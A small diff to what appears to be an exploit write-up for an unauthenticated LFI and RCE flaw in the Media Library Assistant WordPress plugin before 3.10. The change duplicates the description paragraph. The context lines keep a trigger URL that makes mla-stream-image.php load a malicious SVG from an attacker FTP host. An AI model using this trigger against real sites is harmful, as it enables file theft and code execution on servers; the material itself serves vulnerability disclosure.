@@ -3,6 +3,9 @@ Media Library Assistant Wordpress Plugin - RCE and LFI
 Description:
 # Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php
 
+Description:
+# Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php
+
 
 #LFI
 
@@ -28,3 +31,6 @@ xmlns="http://www.w3.org/2000/svg">
 
 Then trigger conversion with:
 http://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:21/malicious.svg&mla_debug=log&mla_stream_frame=1
+
+
+
